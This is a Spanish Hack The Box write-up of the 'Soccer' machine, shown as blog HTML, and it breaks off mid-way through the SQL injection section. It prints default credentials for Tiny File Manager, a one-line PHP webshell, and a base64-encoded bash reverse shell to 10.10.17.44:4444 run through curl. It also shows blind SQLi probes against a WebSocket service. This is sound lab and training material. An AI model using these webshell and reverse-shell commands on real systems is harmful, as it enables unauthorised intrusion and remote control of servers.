@@ -1,0 +1,534 @@
+<!doctype html><html lang="es"><head><title>Soccer | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Máquina fácil. Esta máquina contiene una aplicación Tiny File Manager que nos permite cargar y ejecutar PHP, por lo que podemos obtener una reverse shell como www-data. En la máquina, podemos leer la configuración de nginx y encontrar otro subdominio. Este expone un servidor WebSocket que es vulnerable a Boolean-based Blind SQLi. Al explotar SQLi, podemos encontrar credenciales en texto claro que se reutilizan en SSH. Finalmente, el usuario puede ejecutar dstat como root usando doas, y podemos crear un plugin para escalar privilegios"><meta itemprop="description" content="Hack The Box. Linux. Máquina fácil. Esta máquina contiene una aplicación Tiny File Manager que nos permite cargar y ejecutar PHP, por lo que podemos obtener una reverse shell como www-data. En la máquina, podemos leer la configuración de nginx y encontrar otro subdominio. Este expone un servidor WebSocket que es vulnerable a Boolean-based Blind SQLi. Al explotar SQLi, podemos encontrar credenciales en texto claro que se reutilizan en SSH. Finalmente, el usuario puede ejecutar dstat como root usando doas, y podemos crear un plugin para escalar privilegios"><meta name="twitter:card" content="Hack The Box. Linux. Máquina fácil. Esta máquina contiene una aplicación Tiny File Manager que nos permite cargar y ejecutar PHP, por lo que podemos obtener una reverse shell como www-data. En la máquina, podemos leer la configuración de nginx y encontrar otro subdominio. Este expone un servidor WebSocket que es vulnerable a Boolean-based Blind SQLi. Al explotar SQLi, podemos encontrar credenciales en texto claro que se reutilizan en SSH. Finalmente, el usuario puede ejecutar dstat como root usando doas, y podemos crear un plugin para escalar privilegios"><meta name="twitter:description" content="Hack The Box. Linux. Máquina fácil. Esta máquina contiene una aplicación Tiny File Manager que nos permite cargar y ejecutar PHP, por lo que podemos obtener una reverse shell como www-data. En la máquina, podemos leer la configuración de nginx y encontrar otro subdominio. Este expone un servidor WebSocket que es vulnerable a Boolean-based Blind SQLi. Al explotar SQLi, podemos encontrar credenciales en texto claro que se reutilizan en SSH. Finalmente, el usuario puede ejecutar dstat como root usando doas, y podemos crear un plugin para escalar privilegios"><meta property="og:description" content="Hack The Box. Linux. Máquina fácil. Esta máquina contiene una aplicación Tiny File Manager que nos permite cargar y ejecutar PHP, por lo que podemos obtener una reverse shell como www-data. En la máquina, podemos leer la configuración de nginx y encontrar otro subdominio. Este expone un servidor WebSocket que es vulnerable a Boolean-based Blind SQLi. Al explotar SQLi, podemos encontrar credenciales en texto claro que se reutilizan en SSH. Finalmente, el usuario puede ejecutar dstat como root usando doas, y podemos crear un plugin para escalar privilegios"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/HTB/Soccer/Soccer.webp"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Soccer/Soccer.webp"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Soccer/Soccer.webp"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="Soccer"><meta property="twitter:title" content="Soccer"><meta property="og:title" content="Soccer"><meta property="og:url" content="https://7rocky.github.io/htb/soccer/"><meta itemprop="keywords" content="php,nginx,python,sudo,file-upload,sqli,default-credentials,password-reuse,rce,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/soccer/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/soccer/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/soccer/&amp;text=Soccer" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/htb/soccer/&amp;title=Soccer" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Soccer</h1><time class="mt4 f6 dib tracked" datetime="2023-06-10T00:00:00+01:00">10 / 06 / 2023</time><br><p class="mb4 f6 dib tracked">17 minutos de lectura</p></header><div class="htb-image"><img alt="Soccer" src="/images/HTB/Soccer/Soccer.webp"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/php" title="PHP">PHP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/nginx" title="nginx">nginx</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/python" title="Python">Python</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sudo" title="<code>sudo</code>"><code>sudo</code></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/file-upload" title="Subida de archivos">Subida de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sqli" title="Inyección de código SQL">Inyección de código SQL</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/default-credentials" title="Credenciales por defecto">Credenciales por defecto</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilización de contraseñas">Reutilización de contraseñas</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecución remota de comandos">Ejecución remota de comandos</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#explotación-de-subida-de-archivos">Explotación de subida de archivos</a></li><li><a href="#encontrando-otro-subdominio">Encontrando otro subdominio</a></li></ul></li><li><a href="#explotación-de-sqli">Explotación de SQLi</a><ul><li><a href="#uso-de-sqlmap">Uso de <code>sqlmap</code></a></li><li><a href="#_exploit_-personalizado"><em>Exploit</em> personalizado</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Fácil</li><li><strong>Dirección IP</strong>: 10.10.11.194</li><li><strong>Fecha</strong>: 17 / 12 / 2022</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.194 -p 22,80,9091
+Nmap scan report for 10.10.11.194
+Host is up (0.11s latency).
+
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
+|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
+|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
+80/tcp   open  http            nginx 1.18.0 (Ubuntu)
+|_http-title: Soccer - Index
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+9091/tcp open  xmltec-xmlmail?
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|   GetRequest:
+|     HTTP/1.1 404 Not Found
+|     Content-Security-Policy: default-src 'none'
+|     X-Content-Type-Options: nosniff
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 139
+|     Date:
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="utf-8"&gt;
+|     &lt;title&gt;Error&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;pre&gt;Cannot GET /&lt;/pre&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions, RTSPRequest:
+|     HTTP/1.1 404 Not Found
+|     Content-Security-Policy: default-src 'none'
+|     X-Content-Type-Options: nosniff
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 143
+|     Date:
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="utf-8"&gt;
+|     &lt;title&gt;Error&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+# Nmap done -- 1 IP address (1 host up) scanned in 23.76 seconds
+</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 9091.</p><h2 id="enumeración">Enumeración</h2><p>Si vamos a <code>http://10.10.11.194</code>, se nos redirige a <code>http://soccer.htb</code>, por lo que tenemos que añadir el dominio <code>soccer.htb</code> en <code>/etc/hosts</code>.</p><p><img src="/images/HTB/Soccer/Soccer-1.webp" alt="Soccer 1"></p><p>Vamos a enumerar algunas rutas con <code>ffuf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://soccer.htb/FUZZ  
+
+<span class="code-dark-blue">[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 61ms]</span>
+    * FUZZ: tiny
+
+<span class="code-dark-green">[Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 43ms]</span>
+    * FUZZ:
+</code></pre></div><p>Vemos la ruta <code>/tiny</code>:</p><p><img src="/images/HTB/Soccer/Soccer-2.webp" alt="Soccer 2"></p><p>Esta es una aplicación <a href="https://tinyfilemanager.github.io/"><em>open-source</em></a> llamada Tiny File Manager, hecha en PHP. Si miramos en el <a href="https://github.com/prasathmani/tinyfilemanager">repositorio de GitHub</a>, veremos que las credenciales por defecto son <code>admin:admin@123</code> y <code>user:12345</code>. Las primeras todavía están configurados, por lo que tenemos acceso a la aplicación:</p><p><img src="/images/HTB/Soccer/Soccer-3.webp" alt="Soccer 3"></p><p>En <code>tiny</code> existe un directorio <code>uploads</code>:</p><p><img src="/images/HTB/Soccer/Soccer-4.webp" alt="Soccer 4"></p><p>Podemos intentar cargar un archivo pinchando en &ldquo;<em>Upload</em>&rdquo;:</p><p><img src="/images/HTB/Soccer/Soccer-5.webp" alt="Soccer 5"></p><h3 id="explotación-de-subida-de-archivos">Explotación de subida de archivos</h3><p>Subamos un archivo PHP como este:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span><span class="mtk1"> </span><span class="mtk7">system</span><span class="mtk1">($_GET[</span><span class="mtk4">"cmd"</span><span class="mtk1">]); </span><span class="mtk5">?</span><span class="mtk5">&gt;</span>  
+</code></pre></div><p><img src="/images/HTB/Soccer/Soccer-6.webp" alt="Soccer 6"></p><p><img src="/images/HTB/Soccer/Soccer-7.webp" alt="Soccer 7"></p><p>Muy bien, parece que se ha subido correctamente. Ahora, si lo abrimos, obtendremos ejecución remota de comandos (RCE) en la máquina:</p><p><img src="/images/HTB/Soccer/Soccer-8.webp" alt="Soccer 8"></p><p>Por tanto, obtengamos una <em>reverse shell</em> en el sistema:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class="code-dark-green">base64</span>
+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'soccer.htb/tiny/uploads/cmd.php?cmd=echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx+|+base64+-d+|+bash'</span>  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.194.
+Ncat: Connection from 10.10.11.194:53704.
+bash: cannot set terminal process group (1067): Inappropriate ioctl for device  
+bash: no job control in this shell
+www-data@soccer:~/html/tiny/uploads$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@soccer:~/html/tiny/uploads$ ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+www-data@soccer:~/html/tiny/uploads$ export TERM=xterm
+www-data@soccer:~/html/tiny/uploads$ export SHELL=bash
+www-data@soccer:~/html/tiny/uploads$ stty rows 50 columns 158
+</code></pre></div><h3 id="encontrando-otro-subdominio">Encontrando otro subdominio</h3><p>Como <code>www-data</code> estamos bastante limitados. Aún así, podemos leer la configuración del servidor nginx. Por ejemplo, podemos descubrir dos sitios habilitados:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@soccer:~$ ls -la /etc/nginx/sites-enabled/
+total 8
+drwxr-xr-x 2 root root 4096 Dec  1 13:48 .
+drwxr-xr-x 8 root root 4096 Nov 17 08:06 ..
+lrwxrwxrwx 1 root root   34 Nov 17 08:06 default -&gt; /etc/nginx/sites-available/default
+lrwxrwxrwx 1 root root   41 Nov 17 08:39 soc-player.htb -&gt; /etc/nginx/sites-available/soc-player.htb  
+</code></pre></div><p>El archivo de configuración <code>default</code> es para <code>soccer.htb</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7">server</span> {
+        <span class="mtk5">listen</span> <span class="mtk4">80</span>;
+        <span class="mtk5">listen</span> [::]:80;
+        <span class="mtk5">server_name</span> <span class="mtk4">0.0.0.0</span>;
+        <span class="mtk7">return</span> <span class="mtk4">301</span> http://soccer.htb$request_uri;
+}
+
+<span class="mtk7">server</span> {
+        <span class="mtk5">listen</span> <span class="mtk4">80</span>;
+        <span class="mtk5">listen</span> [::]:80;
+        <span class="mtk5">server_name</span> soccer.htb;
+        <span class="mtk5">root</span> /var/www/html;
+        <span class="mtk5">index</span> index.html tinyfilemanager.php;
+
+        <span class="mtk7">location</span> <span class="mtk8">/</span> {
+                <span class="mtk5">try_files</span> $uri $uri/ <span class="mtk6">=404</span>;
+        }
+
+        <span class="mtk7">location</span> ~ <span class="mtk9">\.php$</span> {
+                <span class="mtk5">include</span> snippets/fastcgi-php.conf;
+                <span class="mtk5">fastcgi_pass</span> unix:/run/php/php7.4-fpm.sock;  
+        }
+
+        <span class="mtk7">location</span> ~ <span class="mtk9">/\.ht</span> {
+                <span class="mtk5">deny</span> <span class="mtk6">all</span>;
+        }
+
+}
+</code></pre></div><p>Y este es <code>soc-player.htb</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7">server</span> {
+        <span class="mtk5">listen</span> <span class="mtk4">80</span>;
+        <span class="mtk5">listen</span> [::]:80;
+
+        <span class="mtk5">server_name</span> soc-player.soccer.htb;
+
+        <span class="mtk5">root</span> /root/app/views;
+
+        <span class="mtk7">location</span> <span class="mtk8">/</span> {
+                <span class="mtk5">proxy_pass</span> http://localhost:3000;
+                <span class="mtk5">proxy_http_version</span> <span class="mtk6">1.1</span>;
+                <span class="mtk5">proxy_set_header</span> Upgrade $http_upgrade;  
+                <span class="mtk5">proxy_set_header</span> Connection <span class="mtk4">'upgrade'</span>;
+                <span class="mtk5">proxy_set_header</span> Host $host;
+                <span class="mtk5">proxy_cache_bypass</span> $http_upgrade;
+        }
+
+}
+</code></pre></div><p>El código fuente del servidor está en <code>/root/app/views</code>, por lo que no tenemos permisos para verlo. Sin embargo, sabemos que hay un subdominio llamado <code>soc-player.soccer.htb</code>. Después de configurarlo en <code>/etc/hosts</code>, tenemos este sitio web:</p><p><img src="/images/HTB/Soccer/Soccer-9.webp" alt="Soccer 9"></p><p>Nos registramos:</p><p><img src="/images/HTB/Soccer/Soccer-10.webp" alt="Soccer 10"></p><p>E iniciamos sesión:</p><p><img src="/images/HTB/Soccer/Soccer-11.webp" alt="Soccer 11"></p><p>Y llegamos a esta página:</p><p><img src="/images/HTB/Soccer/Soccer-12.webp" alt="Soccer 12"></p><h2 id="explotación-de-sqli">Explotación de SQLi</h2><p>Aquí podemos intentar buscar nuestro <em>Ticket ID</em>:</p><p><img src="/images/HTB/Soccer/Soccer-13.webp" alt="Soccer 13"></p><p>Pero no funciona. Intentemos explotar una vulnerabilidad de inyección SQL:</p><p><img src="/images/HTB/Soccer/Soccer-14.webp" alt="Soccer 14"></p><p>¡Es vulnerable! Véase que el <em>ticket</em> existe (ya que <code>1=1</code>). Si ponemos <code>2=1</code>, el <em>ticket</em> ya no existe:</p><p><img src="/images/HTB/Soccer/Soccer-15.webp" alt="Soccer 15"></p><p>Por lo tanto, tenemos un SQLi de tipo <em>Boolean-based Blind</em>. Con este tipo de SQLi, podemos obtener todo el contenido de la base de datos carácter a carácter (ya que tenemos un oráculo: verdadero o falso).</p><p>Si inspeccionamos cómo se realizan las peticiones, se implementan en WebSocket:</p><p><img src="/images/HTB/Soccer/Soccer-16.webp" alt="Soccer 16"></p><p><img src="/images/HTB/Soccer/Soccer-17.webp" alt="Soccer 17"></p><h3 id="uso-de-sqlmap">Uso de <code>sqlmap</code></h3><p>La herramienta más común para explotar SQLi es <code>sqlmap</code>. Sin embargo, esta vez no funcionará porque la vulnerabilidad se explota a través de WebSocket, no HTTP. Por lo tanto, debemos usar un <em>proxy</em> para traducir las peticiones HTTP a WebSocket y viceversa, de modo que <code>sqlmap</code> ataque al <em>proxy</em> y el <em>proxy</em> reenvíe las peticiones HTTP al servidor de WebSocket.</p><p>Buscando un <em>proxy</em> así, podemos encontrar <a href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">este artículo</a>, que muestra una implementación en Python.</p><p>Solo necesitamos editar esta línea:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">ws_server</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"ws://soc-player.soccer.htb:9091"</span>  
